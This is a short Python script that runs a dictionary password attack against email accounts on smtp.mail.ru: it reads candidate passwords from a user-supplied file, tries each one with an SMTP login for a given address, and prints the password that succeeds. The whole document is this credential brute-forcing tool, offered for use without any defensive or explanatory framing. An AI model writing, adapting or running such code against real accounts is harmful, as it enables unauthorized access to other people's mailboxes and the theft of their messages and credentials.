import smtplib
from os import system

    
file = input("Name of bd file...")
bd = open(file,'r')
lst  = bd.readlines()
 
login = input('Input your email')
server = smtplib.SMTP_SSL('smtp.mail.ru', 465)
server.ehlo()
for p in lst:
    try:
        server.login(login, p)
        print('>>> ' + p)
        input("")
        break
    except:
        print ('not found ' + p)
